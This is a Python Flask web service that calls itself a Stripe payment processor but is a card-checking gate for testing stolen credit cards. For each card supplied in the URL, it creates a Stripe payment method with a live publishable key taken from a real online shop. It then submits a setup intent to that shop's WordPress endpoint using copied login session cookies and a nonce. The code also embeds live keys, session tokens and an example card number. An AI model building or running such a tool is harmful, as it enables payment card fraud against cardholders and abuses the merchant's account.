from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

def validate_credit_card(card_data):
    """
    Validate credit card data format
    Expected format: card_no|mm|yy|cvv
    """
    if not card_data:
        return False, "No card data provided"
    
    parts = card_data.split('|')
    if len(parts) != 4:
        return False, "Invalid format. Use: card_no|mm|yy|cvv"
    
    card_no, mm, yy, cvv = parts
    
    # Validate card number (basic check)
    if not re.match(r'^\d{13,19}$', card_no):
        return False, "Invalid card number"
    
    # Validate month
    if not re.match(r'^\d{1,2}$', mm) or not (1 <= int(mm) <= 12):
        return False, "Invalid month (01-12)"
    
    # Validate year (accept both yy and yyyy)
    if not re.match(r'^\d{2,4}$', yy):
        return False, "Invalid year"
    
    # Convert year to 2-digit format if needed
    if len(yy) == 4:
        yy = yy[2:]
    
    # Validate CVV
    if not re.match(r'^\d{3,4}$', cvv):
        return False, "Invalid CVV"
    
    return True, {
        'card_no': card_no,
        'mm': mm.zfill(2),  # Ensure 2-digit month
        'yy': yy,
        'cvv': cvv
    }

@app.route('/gate=stripeauth/cc=<path:card_data>', methods=['GET'])
def process_payment(card_data):
    """
    Process Stripe payment with provided credit card data
    Format: /gate=stripeauth/cc=card_no|mm|yy|cvv
    """
    try:
        # Validate card data
        is_valid, validation_result = validate_credit_card(card_data)
        
        if not is_valid:
            return jsonify({
                'status': 'error',
                'message': validation_result
            }), 400
        
        cc_data = validation_result
        
        # Step 1: Create payment method with Stripe
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }

        data = f'type=card&card[number]={cc_data["card_no"]}&card[cvc]={cc_data["cvv"]}&card[exp_year]={cc_data["yy"]}&card[exp_month]={cc_data["mm"]}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2F7ab2721f84%3B+stripe-js-v3%2F7ab2721f84%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fshop.wiseacrebrew.com&time_on_page=277623&client_attribution_metadata[client_session_id]=63b40a11-d53d-4b60-af73-bf1f472c55ce&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=885aa08a-48ed-453e-928e-92fab222bb47&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_attribution_metadata[merchant_integration_additional_elements][1]=achBankSearchResults&guid=34461288-8dd1-47ee-ae6e-385ae0f1e4d5595130&muid=810cf478-762b-4d16-a93b-12120ff987f883bbe6&sid=73f92f0a-e14b-432b-8799-9e8cb89297f886157f&key=pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy&_stripe_version=2024-06-20'

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
        
        if response.status_code != 200:
            return jsonify({
                'status': 'error',
                'message': f'Stripe API error: {response.status_code}',
                'response': response.text
            }), 400
        
        op = response.json()
        
        if 'id' not in op:
            return jsonify({
                'status': 'error',
                'message': 'Failed to create payment method',
                'response': op
            }), 400
            
        payment_method_id = op["id"]

        # Step 2: Process payment with the created payment method
        cookies = {
            '_ga': 'GA1.1.1677572053.1762021267',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-11-01%2017%3A51%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_first_add': 'fd%3D2025-11-01%2017%3A51%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
            'mtk_src_trk': '%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fshop.wiseacrebrew.com%2F%22%2C%22session_start_time%22%3A%222025-11-01%2017%3A51%3A08%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D',
            'wordpress_sec_dedd3d5021a06b0ff73c12d14c2f177c': 'wizardlyaura999%7C1763230916%7CA4Tikd7dZ2HEZqI368RbvldTzpL8i52015Q36nWQG85%7C19bc61f5ee9046838995c6c842b6ff65c5a93d5cd66ad27045c4fbbb1b919efe',
            'wordpress_logged_in_dedd3d5021a06b0ff73c12d14c2f177c': 'wizardlyaura999%7C1763230916%7CA4Tikd7dZ2HEZqI368RbvldTzpL8i52015Q36nWQG85%7C4814b16d264498b11235fd8fe79fe4c4a5cf21b92ce389e6c62686a834032c08',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
            'sbjs_current': '%C2%9E%C3%A9e',
            '__stripe_mid': '810cf478-762b-4d16-a93b-12120ff987f883bbe6',
            '__stripe_sid': '73f92f0a-e14b-432b-8799-9e8cb89297f886157f',
            'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2Faccount%2Fadd-payment-method%2F',
            '_ga_94LZDRFSLM': 'GS2.1.s1762021267$o1$g1$t1762021431$j24$l0$h0',
        }

        headers = {
            'authority': 'shop.wiseacrebrew.com',
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://shop.wiseacrebrew.com',
            'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': '3a28ca36fe',
        }

        response = requests.post('https://shop.wiseacrebrew.com/wp/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)

        return jsonify({
            'status': 'success',
            'payment_method_id': payment_method_id,
            'response': response.text,
            'status_code': response.status_code
        })

    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Internal server error: {str(e)}'
        }), 500

@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint for Render"""
    return jsonify({'status': 'healthy', 'message': 'Server is running'})

@app.route('/', methods=['GET'])
def home():
    """Home endpoint with usage instructions"""
    return jsonify({
        'message': 'Stripe Payment Processor API',
        'usage': 'GET /gate=stripeauth/cc=card_no|mm|yy|cvv',
        'example': '/gate=stripeauth/cc=5392582546656184|08|26|416',
        'supported_formats': [
            'card_no|mm|yy|cvv',
            'card_no|mm|yyyy|cvv'
        ]
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)